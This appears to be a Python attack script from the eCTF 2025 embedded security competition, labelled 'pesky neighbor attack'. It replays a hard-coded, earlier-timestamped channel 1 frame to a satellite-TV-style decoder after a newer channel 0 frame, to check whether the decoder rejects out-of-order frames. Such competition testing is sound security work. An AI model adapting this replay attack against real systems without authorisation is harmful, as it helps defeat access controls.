import time
import sys
import struct

from ectf25.utils.decoder import DecoderIntf

# Latest channel 0 frame
ch0_frame = {"channel": 0, "timestamp": 1488286097654966, "encoded": "00000000b6c42c9c9649050059bea1cf455b33ec983dc4d325add209c71b6b0e37a70c0ba754284667abbc2668173b58b09d93b6476a046f59003dc82c8c04a4fe0bf509d04457a26c10314bf76d8dcdf9d197f0d5081801a5bbbec6c48d35dbcb56f9aa751b990732a3dd19040c4289e0d15014ce48cc9856fe8de0841ee56557c9692a525b9b3f26bc1fece84dcf4449565573f7886504"}

# Earlier channel 1 frame
ch1_frame = {"channel": 1, "timestamp": 1488286025837576, "encoded": "0100000008ece497964905007df31db4cc1e7dad5a1a5a65f61a084ba04e2df75aac1d057e4d82f59f0734d112080b851733eb5a98318c1d437f3cdc5894781634d60891afb62d44c40d5f8bf29b7d39bd19f035500b233c0ac9527580709fbd98350bcc12b1501024cc31e855a87755a39d02f58e4bb2237a028fc38f7583ad4cd0d142d73e040087862c5856c3bfdb0287af56ad4c510b"}

def gen_subscription(device_id, start, end, channel):
    return struct.pack("<IQQI", device_id, start, end, channel)

if __name__ == "__main__":
    print("Running pesky neighbor attack")

    time.sleep(1)

    decoder = DecoderIntf(sys.argv[1])

    decoder.list()

    decoder.decode(bytes.fromhex(ch0_frame["encoded"]))

    decoder.decode(bytes.fromhex(ch1_frame["encoded"]))

    print("Successfully decoded earlier frame")
